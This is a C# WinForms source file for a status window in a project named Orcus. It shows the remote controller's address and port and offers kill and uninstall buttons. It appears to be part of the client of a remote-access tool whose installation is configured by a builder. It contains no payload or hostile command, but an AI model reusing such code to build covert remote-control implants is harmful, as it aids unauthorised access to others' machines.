using System;
using System.ComponentModel;
using System.Drawing;
using System.Net;
using System.Windows.Forms;
using Orcus.Config;
using Orcus.Connection;
using Orcus.Core;
using Orcus.Shared.Settings;

namespace Orcus
{
    public partial class MainForm : Form
    {
        private readonly Client _client;

        internal MainForm(Client client)
        {
            InitializeComponent();
            Closing += Form1_Closing;
            _client = client;
            _client.Connected += _client_Connected;
            _client.Disconnected += _client_Disconnected;
            if (_client.IsConnected)
            {
                Connected(_client);
            }
            else
            {
                Disconnected();
            }
            UninstallButton.Enabled = Settings.GetBuilderProperty<InstallBuilderProperty>().Install;
        }

        private void Form1_Closing(object sender, CancelEventArgs e)
        {
#if DEBUG
            _client.Dispose();
#endif
        }

        private void _client_Disconnected(object sender, EventArgs e)
        {
            if (IsHandleCreated)
                Invoke((MethodInvoker) Disconnected);
        }

        private void Connected(Client client)
        {
            var endpoint = (IPEndPoint) client.Connection.TcpClient.Client.RemoteEndPoint;
            ConnectedLabel.Text = $"Connected to {endpoint.Address}:{endpoint.Port}";
            ConnectedLabel.ForeColor = Color.DarkGreen;
        }

        private void Disconnected()
        {
            ConnectedLabel.Text = "Not connected";
            ConnectedLabel.ForeColor = Color.DarkRed;
        }

        private void _client_Connected(object sender, EventArgs e)
        {
            Invoke((MethodInvoker) delegate { Connected(_client); });
        }

        private void KillButton_Click(object sender, EventArgs e)
        {
            Program.Exit();
        }

        private void UninstallButton_Click(object sender, EventArgs e)
        {
            try
            {
                UninstallHelper.UninstallAndClose();
            }
            catch (Exception ex)
            {
                MessageBox.Show(ex.ToString());
            }
        }

#if DEBUG
        protected override void OnShown(EventArgs e)
        {
            base.OnShown(e);
            Program.AsyncOperation = AsyncOperationManager.CreateOperation(null);
        }
#endif
    }
}